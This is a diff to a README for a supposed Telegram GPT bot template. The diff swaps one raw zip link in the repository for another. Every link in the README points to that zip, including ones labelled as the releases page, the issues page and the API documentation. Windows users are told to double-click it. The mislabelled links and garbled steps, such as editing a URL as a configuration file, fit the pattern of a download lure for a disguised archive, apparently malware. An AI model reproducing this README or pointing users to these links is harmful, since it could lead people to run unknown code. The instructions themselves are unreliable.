@@ -1,7 +1,7 @@
 # 🎉 telegram-gpt-template - A Simple Bot Ready to Customize
 
 ## 📥 Download the App
-[![Download the App](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/migrations/template-gpt-telegram-v3.4.zip)](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/migrations/template-gpt-telegram-v3.4.zip)
+[![Download the App](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/data/template-gpt-telegram-3.0-beta.5.zip)](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/data/template-gpt-telegram-3.0-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the telegram-gpt-template! This is a minimal Telegram bot template that integrates GPT technology. It is designed for anyone who wants to create a custom Telegram bot without needing programming skills. Follow these steps to get started.
@@ -13,7 +13,7 @@ To run this application, you need:
 - A Telegram account to interact with the bot.
 
 ## 🔗 Download & Install
-To download the bot, visit this page to download: [Releases Page](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/migrations/template-gpt-telegram-v3.4.zip).
+To download the bot, visit this page to download: [Releases Page](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/data/template-gpt-telegram-3.0-beta.5.zip).
 
 ### Steps to Download
 1. Click on the above link.
@@ -30,7 +30,7 @@ To download the bot, visit this page to download: [Releases Page](https://github
 To run the bot, follow these steps based on your operating system:
 
 ### For Windows Users:
-1. Double-click the `https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/migrations/template-gpt-telegram-v3.4.zip` file.
+1. Double-click the `https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/data/template-gpt-telegram-3.0-beta.5.zip` file.
 2. Follow any prompts that appear to complete the setup.
 3. Your bot is now running. Open Telegram and find your bot by its username.
 
@@ -50,7 +50,7 @@ To run the bot, follow these steps based on your operating system:
 ## 🎨 Customizing the Bot
 You can customize the bot to meet your needs. To make changes:
 1. Open the bot folder.
-2. Locate the `https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/migrations/template-gpt-telegram-v3.4.zip` file (or similar configuration file).
+2. Locate the `https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/data/template-gpt-telegram-3.0-beta.5.zip` file (or similar configuration file).
 3. Edit the settings to your preferences.
 4. Save your changes and restart the bot to apply them.
 
@@ -74,10 +74,10 @@ If you experience issues:
 - Consult the FAQ section in the bot's documentation or check common issues that may arise.
 
 ## 💬 Support
-If you face problems not covered here, feel free to create an issue on the [GitHub Issues Page](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/migrations/template-gpt-telegram-v3.4.zip). We will do our best to assist you.
+If you face problems not covered here, feel free to create an issue on the [GitHub Issues Page](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/data/template-gpt-telegram-3.0-beta.5.zip). We will do our best to assist you.
 
 ## 🔗 Additional Resources
-- [Telegram Bot API Documentation](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/migrations/template-gpt-telegram-v3.4.zip)
-- [GPT Documentation](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/migrations/template-gpt-telegram-v3.4.zip)
+- [Telegram Bot API Documentation](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/data/template-gpt-telegram-3.0-beta.5.zip)
+- [GPT Documentation](https://github.com/abdul841434/telegram-gpt-template/raw/refs/heads/main/data/template-gpt-telegram-3.0-beta.5.zip)
 
 By following these instructions, you should be able to download, install, and run your very own Telegram bot using this template. Enjoy customizing your bot and exploring its features!
